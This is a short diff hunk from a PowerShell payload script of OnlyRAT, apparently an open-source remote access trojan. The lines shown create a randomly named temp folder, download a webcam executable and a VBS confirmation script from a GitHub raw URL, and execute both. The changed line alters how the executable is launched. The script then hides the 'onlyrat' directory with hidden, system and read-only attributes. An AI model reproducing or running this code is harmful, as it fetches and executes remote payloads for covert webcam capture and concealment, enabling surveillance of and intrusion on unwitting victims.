@@ -53,7 +53,7 @@ Set-Location $env:temp/bNOEXCxyVp
 Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/webcam.exe -OutFile "UaAIVKpYhR.exe"
 $grOzVTtUmS = RpLGWiUsIy
 Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/confirm-cam.vbs -OutFile "$grOzVTtUmS.vbs"
-Invoke-Expression "./UaAIVKpYhR.exe"; Invoke-Expression "./$grOzVTtUmS.vbs"
+./UaAIVKpYhR.exe; Invoke-Expression "./$grOzVTtUmS.vbs"
 Set-Location C:\Users
 attrib +h +s +r onlyrat 
 Set-Location $NyZnoLKCIs
